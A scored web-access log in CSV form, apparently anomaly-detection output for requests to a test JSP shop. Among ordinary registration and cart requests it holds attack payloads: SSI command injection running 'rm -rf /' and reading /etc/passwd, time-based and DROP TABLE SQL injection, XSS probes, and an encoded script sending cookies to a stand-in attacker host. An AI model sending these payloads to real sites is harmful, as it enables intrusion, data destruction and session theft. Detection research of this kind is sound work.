score_content,score_session,score_fused,line
53.893497467041016,330.9263916015625,192.40994453430176,localhost:8080 - - [10/Jan/2025:15:49:48 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bobbette&password=v4N0c76.SE&nombre=Albere&apellidos=Casa+Aro-ca&email=mallalieu%40soymuyguapa.ml&dni=58990935Y&direccion=Pla%E7a+Puerto+Rico%2C+144+&ciudad=Guadalajara&cp=21320&provincia=Soria&ntc=0626053300449217&B1=Registrar HTTP/1.1 HTTP/1.1" 200 921 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:49:48 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
54.634334564208984,335.529052734375,195.081693649292,localhost:8080 - - [10/Jan/2025:15:49:49 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bobbette&password=v4N0c76.SE&nombre=Albere&apellidos=Guri+Oll%E9s&email=mallalieu%40soymuyguapa.ml&dni=58990935Y&direccion=Pla%E7a+Puerto+Rico%2C+144+&ciudadA=Guadalajara&cp=21320&provincia=Soria&ntc=0626053300449217&B1=Registrar HTTP/1.1 HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:49:49 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,14.808660507202148,10.130792379379272,localhost:8080 - - [10/Jan/2025:15:49:49 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:49 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.823276698589325,12.198873519897461,6.511075109243393,localhost:8080 - - [10/Jan/2025:15:49:50 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 213 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.22602993249893188,5.729245662689209,2.9776377975940704,localhost:8080 - - [10/Jan/2025:15:49:50 +0000] "GET http://localhost:8080/tienda1/publico.Old HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.16199034452438354,4.258908748626709,2.2104495465755463,localhost:8080 - - [10/Jan/2025:15:49:50 +0000] "GET http://localhost:8080/certsrv.nsf HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
44.431949615478516,271.9197692871094,158.17585945129395,localhost:8080 - - [10/Jan/2025:15:49:50 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=arco&password=b74RerA&nombre=Agueda&apellidos=Sauri+Sanaspleda&email=%2520&dni=57154114B&direccion=Calle+Medellin+188%2C+3E&ciudad=A%F1ana&cp=26360&provincia=C%E1ceres&ntc=6165671894107883&B1=Registrar HTTP/1.1 HTTP/1.1" 200 840 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:49:51 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
56.132545471191406,344.8301696777344,200.4813575744629,localhost:8080 - - [10/Jan/2025:15:49:51 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=arco&password=b74RerA&nombre=Agueda&apellidos=Sauri+Sanaspleda&email=gozzi%40encuentrodominios.at&dni=57154114B&direccion=Calle+Medellin+188%2C+3E&ciudad=H%2Ferram%E9lluri&cp=26360&provincia=C%E1ceres&ntc=6165671894107883&B1=Registrar HTTP/1.1 HTTP/1.1" 200 939 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:49:51 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
52.7926025390625,324.0823974609375,188.4375,localhost:8080 - - [10/Jan/2025:15:49:51 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=arco&password=b74RerA&nombre=Agueda&apellidos=Sauri+Sanaspleda&email=gozzi%40encuentrodominios.at&dni=57154114B&direccion=Calle+Medellin+188%2C+3E&ciudad=A%F1ana&cp=26360&provincia=C%E1ceres&ntc=6165671894107883&B1=Registrar HTTP/1.1 HTTP/1.1" 200 912 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:49:52 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.1592509746551514,15.173437118530273,8.166344046592712,localhost:8080 - - [10/Jan/2025:15:49:52 +0000] "GET http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif.INC HTTP/1.1 HTTP/1.1" 200 234 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3734517097473145,4.086627006530762,2.730039358139038,localhost:8080 - - [10/Jan/2025:15:49:52 +0000] "GET http://localhost:8080/wliconsole HTTP/1.1 HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
295.4432373046875,1789.6982421875,1042.5707397460938,localhost:8080 - - [10/Jan/2025:15:49:52 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Riojasessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&precio=85&cantidad=21&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 2067 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:53 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
19.946752548217773,115.97470092773438,67.96072673797607,localhost:8080 - - [10/Jan/2025:15:49:53 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 567 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:53 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.177067756652832,50.306522369384766,30.2417950630188,localhost:8080 - - [10/Jan/2025:15:49:53 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=21&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:54 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.688732147216797,46.867305755615234,28.278018951416016,localhost:8080 - - [10/Jan/2025:15:49:54 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precioA=85&cantidad=21&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 378 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:54 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.653350830078125,140.0756072998047,81.8644790649414,localhost:8080 - - [10/Jan/2025:15:49:54 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=perkins%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=7ad524z&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 618 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:15:49:55 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.452856063842773,45.196075439453125,27.32446575164795,localhost:8080 - - [10/Jan/2025:15:49:55 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=perkins&pwd=7ad524z&remember=on%2F&B1=Entrar HTTP/1.1 HTTP/1.1" 200 372 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:15:49:55 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.336993217468262,44.37255859375,26.85477590560913,localhost:8080 - - [10/Jan/2025:15:49:55 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=perkins&pwd=7ad524z&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 369 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,8.747926712036133,5.962555885314941,localhost:8080 - - [10/Jan/2025:15:49:56 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5895740985870361,9.972355842590332,5.280964970588684,localhost:8080 - - [10/Jan/2025:15:49:56 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp.bak HTTP/1.1 HTTP/1.1" 200 195 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,14.808660507202148,10.130792379379272,localhost:8080 - - [10/Jan/2025:15:49:56 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%4040 HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3401055335998535,10.415877342224121,6.877991437911987,localhost:8080 - - [10/Jan/2025:15:49:56 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.2638726234436035,13.12624740600586,9.195060014724731,localhost:8080 - - [10/Jan/2025:15:49:57 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3401055335998535,10.415877342224121,6.877991437911987,localhost:8080 - - [10/Jan/2025:15:49:57 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
15.392792701721191,85.89103698730469,50.64191484451294,localhost:8080 - - [10/Jan/2025:15:49:57 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 495 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:57 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
13.258037567138672,71.52468872070312,42.3913631439209,localhost:8080 - - [10/Jan/2025:15:49:58 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 HTTP/1.1 HTTP/1.1" 200 456 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:58 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.4315505027771,22.85451889038086,14.64303469657898,localhost:8080 - - [10/Jan/2025:15:49:58 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:49:58 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
8.153767585754395,35.846805572509766,22.00028657913208,localhost:8080 - - [10/Jan/2025:15:49:59 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1980%27INJECTED_PARAM&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 336 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:49:59 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.177067756652832,50.306522369384766,30.2417950630188,localhost:8080 - - [10/Jan/2025:15:49:59 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1980&B1=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:49:59 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.890066623687744,26.411399841308594,16.65073323249817,localhost:8080 - - [10/Jan/2025:15:50:00 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1980&B1=Confirmar%2F HTTP/1.1 HTTP/1.1" 200 294 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:50:00 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.731695175170898,25.193195343017578,15.962445259094238,localhost:8080 - - [10/Jan/2025:15:50:00 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=1980&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,7.290140628814697,5.169692277908325,localhost:8080 - - [10/Jan/2025:15:50:00 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
74.0687026977539,455.5816650390625,264.8251838684082,localhost:8080 - - [10/Jan/2025:15:50:01 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro%27INJECTED_PARAM&login=benny&password=0REn3Ga6&nombre=Eudosio&apellidos=Miguez+Chew&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=76229865E&direccion=Travesia+1+De+Los+Laureles%2C+144%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=28300&provincia=Burgos&ntc=9519490312798235&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:50:01 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
66.82245635986328,410.9576416015625,238.8900489807129,localhost:8080 - - [10/Jan/2025:15:50:01 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=benny&password=0REn3Ga6&nombre=Eudosio&apellidos=Miguez+Chew&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=17AA7982F&direccion=Travesia+1+De+Los+Laureles%2C+144%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=28300&provincia=Burgos&ntc=9519490312798235&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:50:01 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
67.23767852783203,413.5186767578125,240.37817764282227,localhost:8080 - - [10/Jan/2025:15:50:02 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=benny&password=0REn3Ga6&nombre=Eudosio&apellidos=Miguez+Chew&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=76229865E&direccion=Travesia+1+De+Los+Laureles%2C+144%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=28300&provinciaA=Burgos&ntc=9519490312798235&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1023 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,8.139467239379883,5.630635976791382,localhost:8080 - - [10/Jan/2025:15:50:02 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.897814750671387,18.569156646728516,12.233485698699951,localhost:8080 - - [10/Jan/2025:15:50:02 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoAND+1%3D1 HTTP/1.1 HTTP/1.1" 200 252 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:50:02 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.557831764221191,52.97054672241211,31.76418924331665,localhost:8080 - - [10/Jan/2025:15:50:03 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E HTTP/1.1 HTTP/1.1" 200 399 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:50:03 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,14.808660507202148,10.130792379379272,localhost:8080 - - [10/Jan/2025:15:50:03 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,7.564772605895996,5.318400859832764,localhost:8080 - - [10/Jan/2025:15:50:03 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4617548882961273,8.654851913452148,4.558303400874138,localhost:8080 - - [10/Jan/2025:15:50:04 +0000] "GET http://localhost:8080/techniques/servlets/index.html HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
54.634334564208984,335.529052734375,195.081693649292,localhost:8080 - - [10/Jan/2025:15:50:04 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Bald%ED+Almansa&email=damboise%40automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima%2C+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=0908077134973737&B1=Registrar%2B HTTP/1.1 HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:50:04 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
77.168212890625,474.6274108886719,275.89781188964844,localhost:8080 - - [10/Jan/2025:15:50:04 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Bald%ED+Almansa&email=damboise%40automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima%2C+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1092 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:50:05 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
51.344017028808594,315.0688781738281,183.20644760131836,localhost:8080 - - [10/Jan/2025:15:50:05 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Linga%2Fn&email=damboise%40automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima%2C+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=0908077134973737&B1=Registrar HTTP/1.1 HTTP/1.1" 200 900 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,7.847889423370361,5.472053050994873,localhost:8080 - - [10/Jan/2025:15:50:05 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
53.893497467041016,330.9263916015625,192.40994453430176,localhost:8080 - - [10/Jan/2025:15:50:05 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Bald%ED+Almansa&emailA=damboise%40automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima%2C+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=0908077134973737&B1=Registrar HTTP/1.1 HTTP/1.1" 200 921 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
